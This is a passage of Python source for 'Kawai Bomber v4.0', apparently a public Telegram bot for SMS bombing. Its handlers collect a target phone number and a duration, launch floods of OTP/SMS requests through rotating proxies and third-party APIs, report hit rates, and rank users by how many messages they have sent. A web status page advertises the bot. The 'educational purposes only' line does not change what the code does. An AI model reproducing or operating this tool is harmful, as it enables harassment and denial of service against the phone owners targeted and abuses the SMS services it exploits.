        f"{EMOJIS['rocket']} <b>ATTACK READY FOR LAUNCH!</b>\n\n"
        f"{EMOJIS['target']} <b>Target:</b> +{country_code} <code>{phone}</code>\n"
        f"{EMOJIS['clock']} <b>Duration:</b> {duration} minutes\n"
        f"{EMOJIS['sms']} <b>Estimated SMS:</b> {estimated_hits}\n"
        f"{EMOJIS['proxy']} <b>Proxies:</b> {len(PROXIES)} rotating\n"
        f"{EMOJIS['speed']} <b>APIs:</b> {len(REAL_APIS.get(country_code, [])) + len(REAL_APIS.get('multi', []))} endpoints\n\n"
        f"{EMOJIS['fire']} <b>Attack will:</b>\n"
        f"• Use real SMS APIs\n"
        f"• Rotate {len(PROXIES)} proxies\n"
        f"• Send OTP/SMS requests\n\n"
        f"{EMOJIS['warning']} <b>Confirm launch?</b>",
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup
    )
    
    return CONFIRM

async def confirm_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle confirmation"""
    query = update.callback_query
    await query.answer()
    
    if "no" in query.data:
        await query.edit_message_text(
            f"{EMOJIS['success']} <b>Attack cancelled!</b>\n\n"
            f"Use /bomb to start a new attack.",
            parse_mode=ParseMode.HTML
        )
        return ConversationHandler.END
    
    # Get attack parameters
    phone = context.user_data["phone"]
    country_code = context.user_data.get("country_code", "91")
    duration = context.user_data["duration"]
    user_id = query.from_user.id
    
    # Check if APIs exist for this country
    apis_count = len(REAL_APIS.get(country_code, [])) + len(REAL_APIS.get('multi', []))
    if apis_count == 0:
        await query.edit_message_text(
            f"{EMOJIS['error']} <b>No APIs available for country +{country_code}!</b>\n\n"
            f"Please use India (+91) or contact admin to add APIs for your country.",
            parse_mode=ParseMode.HTML
        )
        return ConversationHandler.END
    
    # Create and launch attack
    attack = RealAttackEngine(phone, country_code, user_id, "sms", duration)
    success = await attack.launch_attack()
    
    if not success:
        await query.edit_message_text(
            f"{EMOJIS['error']} <b>Failed to start attack!</b>\n\n"
            f"Please try again or contact support.",
            parse_mode=ParseMode.HTML
        )
        return ConversationHandler.END
    
    # Send confirmation
    await query.edit_message_text(
        f"{EMOJIS['rocket']} <b>ATTACK LAUNCHED SUCCESSFULLY!</b>\n\n"
        f"{EMOJIS['target']} <b>Target:</b> +{country_code} <code>{phone}</code>\n"
        f"{EMOJIS['clock']} <b>Duration:</b> {duration} minutes\n"
        f"{EMOJIS['proxy']} <b>Proxies:</b> {len(PROXIES)} rotating\n"
        f"{EMOJIS['speed']} <b>APIs:</b> {apis_count} endpoints\n"
        f"{EMOJIS['working']} <b>Status:</b> <code>RUNNING</code>\n\n"
        f"{EMOJIS['fire']} <b>Attack has started!</b>\n"
        f"• Real SMS APIs activated\n"
        f"• Proxy rotation enabled\n"
        f"• Multiple endpoints firing\n\n"
        f"{EMOJIS['warning']} Use /stop to stop attack\n"
        f"{EMOJIS['stats']} Use /status to check progress",
        parse_mode=ParseMode.HTML
    )
    
    # Send periodic updates
    asyncio.create_task(send_real_attack_updates(query.message.chat_id, attack, user_id))
    
    return ConversationHandler.END

async def send_real_attack_updates(chat_id, attack, user_id):
    """Send periodic attack updates for real attack"""
    try:
        update_count = 0
        while attack.is_running:
            await asyncio.sleep(30)  # Update every 30 seconds
            
            stats = attack.get_stats()
            if not attack.is_running:
                break
            
            update_count += 1
            
            # Calculate rate
            total_requests = stats['success'] + stats['failed']
            elapsed = max(stats['elapsed'], 1)
            success_rate = (stats['success'] / max(total_requests, 1)) * 100
            
            # Send update message
            message = (
                f"{EMOJIS['activity']} <b>ATTACK UPDATE #{update_count}</b>\n\n"
                f"{EMOJIS['target']} Target: +{stats['country_code']} <code>{stats['target']}</code>\n"
                f"{EMOJIS['clock']} Elapsed: {stats['elapsed']} seconds\n"
                f"{EMOJIS['sms_sent']} SMS Sent: {stats['success']}\n"
                f"{EMOJIS['error']} Failed: {stats['failed']}\n"
                f"{EMOJIS['total']} Total: {total_requests}\n"
                f"{EMOJIS['speed']} Rate: {total_requests / elapsed:.1f} req/sec\n"
                f"{EMOJIS['success']} Success Rate: {success_rate:.1f}%\n\n"
                f"{EMOJIS['fire']} <b>Attack is running...</b>"
            )
            
            # Send update
            try:
                from telegram import Bot
                bot = Bot(token=BOT_TOKEN)
                await bot.send_message(
                    chat_id=chat_id,
                    text=message,
                    parse_mode=ParseMode.HTML
                )
            except Exception as e:
                logger.error(f"Failed to send update: {e}")
                
    except asyncio.CancelledError:
        pass
    except Exception as e:
        logger.error(f"Update task error: {e}")

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /stop command"""
    user_id = update.effective_user.id
    
    if user_id not in active_attacks:
        await update.message.reply_text(
            f"{EMOJIS['warning']} <b>No active attack found!</b>\n\n"
            f"You don't have any running attacks.\n"
            f"Use /bomb to start a new attack.",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Stop the attack
    attack = active_attacks[user_id]
    stats = attack.get_stats()
    attack.stop_attack()
    
    # Calculate statistics
    total_requests = stats['success'] + stats['failed']
    success_rate = (stats['success'] / max(total_requests, 1)) * 100 if total_requests > 0 else 0
    
    await update.message.reply_text(
        f"{EMOJIS['success']} <b>ATTACK STOPPED!</b>\n\n"
        f"{EMOJIS['target']} Target: +{stats['country_code']} <code>{stats['target']}</code>\n"
        f"{EMOJIS['clock']} Duration: {stats['elapsed']} seconds\n"
        f"{EMOJIS['sms_sent']} SMS Sent: {stats['success']}\n"
        f"{EMOJIS['error']} Failed: {stats['failed']}\n"
        f"{EMOJIS['total']} Total Requests: {total_requests}\n"
        f"{EMOJIS['success']} Success Rate: {success_rate:.1f}%\n"
        f"{EMOJIS['speed']} Avg Rate: {total_requests / max(stats['elapsed'], 1):.1f} req/sec\n\n"
        f"{EMOJIS['fire']} <b>Attack Summary:</b>\n"
        f"• {stats['success']} SMS successfully sent\n"
        f"• {len(PROXIES)} proxies used\n"
        f"• {len(REAL_APIS.get(stats['country_code'], [])) + len(REAL_APIS.get('multi', []))} APIs utilized\n\n"
        f"{EMOJIS['rocket']} Use /bomb for new attack",
        parse_mode=ParseMode.HTML
    )

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /status command"""
    uptime = datetime.now() - bot_statistics["bot_uptime"]
    hours, remainder = divmod(int(uptime.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    
    # Calculate success rate
    total_requests = bot_statistics["total_sms_sent"] + bot_statistics["total_calls_made"]
    success_rate = (bot_statistics["total_hits"] / max(total_requests, 1)) * 100 if total_requests > 0 else 0
    
    status_message = f"""
{EMOJIS['stats']} <b>KAWAI BOMBER STATUS</b>

{EMOJIS['server']} <b>Server:</b> Railway
{EMOJIS['clock']} <b>Uptime:</b> {hours}h {minutes}m {seconds}s
{EMOJIS['user']} <b>Total Users:</b> {bot_statistics['total_users']}
{EMOJIS['activity']} <b>Active Attacks:</b> {bot_statistics['active_attacks']}
{EMOJIS['total']} <b>Total Sessions:</b> {bot_statistics['total_sessions']}

{EMOJIS['sms_sent']} <b>SMS Sent:</b> {bot_statistics['total_sms_sent']}
{EMOJIS['call_made']} <b>Calls Made:</b> {bot_statistics['total_calls_made']}
{EMOJIS['target']} <b>Total Hits:</b> {bot_statistics['total_hits']}
{EMOJIS['success']} <b>Success Rate:</b> {success_rate:.1f}%

{EMOJIS['proxy']} <b>Proxies:</b> {len(PROXIES)} available
{EMOJIS['speed']} <b>APIs India:</b> {len(REAL_APIS.get('91', []))}
{EMOJIS['global']} <b>APIs Multi:</b> {len(REAL_APIS.get('multi', []))}

{EMOJIS['working']} <b>Bot Status:</b> <code>ONLINE</code>
{EMOJIS['link']} <b>Webhook:</b> {WEBHOOK_URL}

{EMOJIS['heart']} <b>Made by:</b> @zerocyph
"""
    
    await update.message.reply_text(
        status_message,
        parse_mode=ParseMode.HTML
    )

async def mystats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /mystats command"""
    user_id = update.effective_user.id
    username = update.effective_user.username or "User"
    
    if user_id not in user_statistics:
        await update.message.reply_text(
            f"{EMOJIS['warning']} <b>No statistics found!</b>\n\n"
            f"You haven't used the bot yet.\n"
            f"Use /bomb to start your first attack!",
            parse_mode=ParseMode.HTML
        )
        return
    
    stats = user_statistics[user_id]
    
    # Calculate rank based on total hits
    total_hits = stats["total_hits"]
    if total_hits == 0:
        rank = "Beginner"
        level = 1
    elif total_hits < 100:
        rank = "Rookie"
        level = 2
    elif total_hits < 500:
        rank = "Warrior"
        level = 3
    elif total_hits < 1000:
        rank = "Expert"
        level = 4
    elif total_hits < 5000:
        rank = "Master"
        level = 5
    else:
        rank = "Legend"
        level = 6
    
    # Calculate success rate
    total_attacks = stats["sms_count"] + stats["call_count"]
    success_rate = (stats["total_hits"] / max(total_attacks, 1)) * 100 if total_attacks > 0 else 0
    
    # Check if user has active attack
    has_active = user_id in active_attacks
    
    stats_message = f"""
{EMOJIS['stats']} <b>YOUR STATISTICS</b>

{EMOJIS['user']} <b>Username:</b> @{username}
{EMOJIS['id']} <b>User ID:</b> <code>{user_id}</code>
{EMOJIS['clock']} <b>Last Active:</b> {stats['last_active'].strftime('%Y-%m-%d %H:%M:%S')}

{EMOJIS['total']} <b>Total Attacks:</b> {stats['total_attacks']}
{EMOJIS['sms_sent']} <b>SMS Sent:</b> {stats['sms_count']}
{EMOJIS['call_made']} <b>Calls Made:</b> {stats['call_count']}
{EMOJIS['target']} <b>Total Hits:</b> {stats['total_hits']}
{EMOJIS['rotation']} <b>Sessions:</b> {stats['total_sessions']}
{EMOJIS['success']} <b>Success Rate:</b> {success_rate:.1f}%

{EMOJIS['rank']} <b>Rank:</b> {rank}
{EMOJIS['level']} <b>Level:</b> {level}
{EMOJIS['status']} <b>Status:</b> {'🔴 Active Attack' if has_active else '🟢 Ready'}

{EMOJIS['fire']} <b>Performance:</b>
• Average per Attack: {stats['total_hits'] / max(stats['total_attacks'], 1):.0f} hits
• Session Average: {stats['total_hits'] / max(stats['total_sessions'], 1):.0f} hits

{EMOJIS['rocket']} <b>Next Level:</b> Need {max(0, (level * 500) - stats['total_hits'])} more hits
"""
    
    await update.message.reply_text(
        stats_message,
        parse_mode=ParseMode.HTML
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /help command"""
    help_message = f"""
{EMOJIS['help']} <b>KAWAI BOMBER HELP GUIDE</b>

{EMOJIS['star']} <b>Available Commands:</b>
• /start - Start the bot
• /bomb - Start SMS bombing
• /stop - Stop current attack
• /status - Check bot status
• /mystats - View your statistics
• /help - Show this help

{EMOJIS['fire']} <b>How to Use:</b>
1. Send /bomb to start
2. Select country code (default: India +91)
3. Enter target phone number
4. Select duration (1-30 minutes)
5. Confirm and launch attack

{EMOJIS['warning']} <b>Important Notes:</b>
• Use Indian numbers (10 digits without +91)
• For other countries, enter country code
• Don't abuse the service
• For educational purposes only

{EMOJIS['shield']} <b>Features:</b>
• {len(PROXIES)} rotating proxies
• {len(REAL_APIS.get('91', [])) + len(REAL_APIS.get('multi', []))} real APIs
• Real-time statistics
• User ranking system
• Multi-country support

{EMOJIS['heart']} <b>Support:</b>
For issues or questions, contact @zerocyph

{EMOJIS['rocket']} <b>Version:</b> 4.0 | <b>Platform:</b> Railway | <b>APIs:</b> Real
"""
    
    await update.message.reply_text(
        help_message,
        parse_mode=ParseMode.HTML
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle inline button clicks"""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    if data == "start_attack":
        await bomb_command(update, context)
    elif data == "my_stats":
        await mystats_command(update, context)
    elif data == "show_help":
        await help_command(update, context)
    elif data == "bot_status":
        await status_command(update, context)
    elif data.startswith("cc_"):
        await country_code_handler(update, context)
    elif data.startswith("dur_"):
        await duration_handler(update, context)
    elif data.startswith("confirm_"):
        await confirm_handler(update, context)
    else:
        await query.edit_message_text(
            f"{EMOJIS['error']} Unknown command!",
            parse_mode=ParseMode.HTML
        )

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel conversation"""
    await update.message.reply_text(
        f"{EMOJIS['success']} Operation cancelled!",
        parse_mode=ParseMode.HTML
    )
    return ConversationHandler.END

# ==================== WEBHOOK SERVER ====================
async def start_webhook_server(application):
    """Start webhook server for Railway"""
    print(f"{EMOJIS['rocket']} Setting up webhook for Railway...")
    print(f"{EMOJIS['link']} Webhook URL: {WEBHOOK_URL}{WEBHOOK_PATH}")
    
    # Set webhook
    try:
        await application.bot.set_webhook(
            url=f"{WEBHOOK_URL}{WEBHOOK_PATH}",
            secret_token=WEBHOOK_SECRET,
            max_connections=40,
            allowed_updates=Update.ALL_TYPES,
            drop_pending_updates=True
        )
        print(f"{EMOJIS['success']} Webhook set successfully!")
    except Exception as e:
        print(f"{EMOJIS['error']} Failed to set webhook: {e}")
        return None
    
    # Create aiohttp web application
    from aiohttp import web
    
    async def handle_webhook(request):
        """Handle incoming webhook requests"""
        # Verify secret token
        if request.headers.get("X-Telegram-Bot-Api-Secret-Token") != WEBHOOK_SECRET:
            logger.warning("Invalid secret token from: %s", request.remote)
            return web.Response(status=403)
        
        try:
            data = await request.json()
            update = Update.de_json(data, application.bot)
            await application.process_update(update)
            return web.Response()
        except Exception as e:
            logger.error(f"Error processing webhook: {e}")
            return web.Response(status=500)
    
    async def health_check(request):
        """Health check endpoint for Railway"""
        uptime = datetime.now() - bot_statistics["bot_uptime"]
        hours, remainder = divmod(int(uptime.total_seconds()), 3600)
        minutes, seconds = divmod(remainder, 60)
        
        return web.json_response({
            "status": "online",
            "bot": "Kawai Bomber v4.0",
            "version": "4.0",
            "made_by": "@zerocyph",
            "uptime": f"{hours}h {minutes}m {seconds}s",
            "users": bot_statistics["total_users"],
            "active_attacks": bot_statistics["active_attacks"],
            "total_sms_sent": bot_statistics["total_sms_sent"],
            "total_hits": bot_statistics["total_hits"],
            "proxies": len(PROXIES),
            "apis_india": len(REAL_APIS.get("91", [])),
            "apis_multi": len(REAL_APIS.get("multi", [])),
            "platform": "Railway",
            "webhook": f"{WEBHOOK_URL}{WEBHOOK_PATH}"
        })
    
    async def home_page(request):
        """Home page with bot info"""
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>KAWAI BOMBER v4.0</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body {{
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white;
                    text-align: center;
                    padding: 20px;
                    min-height: 100vh;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                }}
                .container {{
                    background: rgba(255, 255, 255, 0.1);
                    backdrop-filter: blur(10px);
                    border-radius: 20px;
                    padding: 40px;
                    max-width: 800px;
                    width: 100%;
                    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
                    border: 1px solid rgba(255, 255, 255, 0.2);
                }}
                h1 {{
                    font-size: 3.5em;
                    margin-bottom: 10px;
                    background: linear-gradient(45deg, #ff6b9d, #c779d0, #4bc0c8);
                    -webkit-background-clip: text;
                    -webkit-text-fill-color: transparent;
                    text-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
                }}
                .emoji {{
                    font-size: 4em;
                    margin: 20px 0;
                }}
                .stats {{
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                    gap: 15px;
                    margin: 30px 0;
                }}
                .stat-box {{
                    background: rgba(255, 255, 255, 0.15);
                    padding: 20px;
                    border-radius: 15px;
                    transition: transform 0.3s;
                }}
                .stat-box:hover {{
                    transform: translateY(-5px);
                    background: rgba(255, 255, 255, 0.25);
                }}
                .stat-value {{
                    font-size: 2em;
                    font-weight: bold;
                    color: #ff6b9d;
                }}
                .status {{
                    background: rgba(0, 255, 0, 0.2);
                    padding: 15px;
                    border-radius: 15px;
                    margin: 20px 0;
                    font-weight: bold;
                    font-size: 1.2em;
                }}
                .api-info {{
                    background: rgba(255, 255, 255, 0.1);
                    padding: 15px;
                    border-radius: 15px;
                    margin: 20px 0;
                }}
                a {{
                    display: inline-block;
                    background: linear-gradient(45deg, #ff6b9d, #c779d0);
                    color: white;
                    padding: 15px 30px;
                    border-radius: 50px;
                    text-decoration: none;
                    font-weight: bold;
                    margin: 10px;
                    transition: transform 0.3s, box-shadow 0.3s;
                }}
                a:hover {{
                    transform: scale(1.05);
                    box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
                }}
                .footer {{
                    margin-top: 30px;
                    color: rgba(255, 255, 255, 0.7);
                    font-size: 0.9em;
                }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="emoji">💣🌸✨</div>
                <h1>KAWAI BOMBER v4.0</h1>
                <p style="font-size: 1.2em; margin-bottom: 20px;">Advanced SMS Bombing Bot with Real APIs</p>
                
                <div class="status">
                    ✅ BOT IS ONLINE & RUNNING
                </div>
                
                <div class="stats">
                    <div class="stat-box">
                        <div class="stat-value">{bot_statistics['total_users']}</div>
                        <div>Total Users</div>
                    </div>
                    <div class="stat-box">
                        <div class="stat-value">{bot_statistics['active_attacks']}</div>
                        <div>Active Attacks</div>
                    </div>
                    <div class="stat-box">
                        <div class="stat-value">{bot_statistics['total_sms_sent']}</div>
                        <div>SMS Sent</div>
                    </div>
                    <div class="stat-box">
                        <div class="stat-value">{len(PROXIES)}</div>
                        <div>Proxies</div>
                    </div>
                </div>
                
                <div class="api-info">
                    <p><strong>API Information:</strong></p>
                    <p>• India APIs: {len(REAL_APIS.get('91', []))}</p>
                    <p>• Multi-Country APIs: {len(REAL_APIS.get('multi', []))}</p>
                    <p>• Total APIs: {len(REAL_APIS.get('91', [])) + len(REAL_APIS.get('multi', []))}</p>
                </div>
                
                <p><strong>Made with ❤️ by @zerocyph</strong></p>
                <p>Version: 4.0 | Platform: Railway | Webhook: Enabled</p>
                
                <div style="margin: 30px 0;">
                    <a href="https://t.me/kawai_bomber_bot" target="_blank">Open in Telegram</a>
                    <a href="/health" target="_blank">API Health</a>
                </div>
                
                <div class="footer">
                    ⚠️ For educational purposes only | Don't abuse the service
                </div>
            </div>
        </body>
        </html>
        """
        return web.Response(text=html, content_type='text/html')
    
    # Create web application
    app = web.Application()
    app.router.add_post(WEBHOOK_PATH, handle_webhook)
    app.router.add_get("/", home_page)
    app.router.add_get("/health", health_check)
    
    return app

# ==================== MAIN FUNCTION ====================
async def main():
    """Main function to run the bot"""
    print(BANNER)
    print(f"{EMOJIS['sparkles']} KAWAI BOMBER v4.0")
    print(f"{EMOJIS['heart']} Made by @zerocyph")
    print(f"{EMOJIS['power']} Powered by Python-Telegram-Bot & Real APIs")
    print(f"{EMOJIS['server']} Railway Deployment: {WEBHOOK_URL}")
    print(f"{EMOJIS['python']} Python {sys.version}")
    print(f"{EMOJIS['sms']} Real APIs Loaded: {len(REAL_APIS.get('91', [])) + len(REAL_APIS.get('multi', []))}")
    print(f"{EMOJIS['proxy']} Proxies Available: {len(PROXIES)}")
    print(f"{EMOJIS['warning']} Starting bot...")
    
    # Validate token
    if not BOT_TOKEN or len(BOT_TOKEN) < 20:
        print(f"\n{EMOJIS['error']} ERROR: Invalid bot token!")
        sys.exit(1)
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Create conversation handler for bomb command
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("bomb", bomb_command)],
        states={
            COUNTRY_CODE: [CallbackQueryHandler(country_code_handler)],
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, phone_handler)],
            DURATION: [CallbackQueryHandler(duration_handler)],
            CONFIRM: [CallbackQueryHandler(confirm_handler)]
        },
        fallbacks=[CommandHandler("cancel", cancel_command)]
    )
    
    # Add handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(conv_handler)
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("mystats", mystats_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CallbackQueryHandler(button_handler))
    
    # Initialize application
    await application.initialize()
    
    # Start webhook server
    app = await start_webhook_server(application)
    if not app:
        print(f"{EMOJIS['error']} Failed to start webhook server!")
        sys.exit(1)
    
    # Start web server
    from aiohttp import web
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    
    print(f"{EMOJIS['rocket']} Webhook server started on port {PORT}")
    print(f"{EMOJIS['star']} Bot is running and ready!")
    print(f"{EMOJIS['link']} Visit: {WEBHOOK_URL}")
    print(f"{EMOJIS['tada']} Bot URL: https://t.me/kawai_bomber_bot")
    print(f"{EMOJIS['fire']} Real SMS APIs: ACTIVE")
    
    # Keep running
    try:
        await asyncio.Event().wait()
    except KeyboardInterrupt:
        print(f"\n{EMOJIS['success']} Stopping bot...")
    finally:
        await runner.cleanup()
        await application.shutdown()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{EMOJIS['success']} Bot stopped by user.")
    except Exception as e:
        print(f"\n{EMOJIS['error']} FATAL ERROR: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
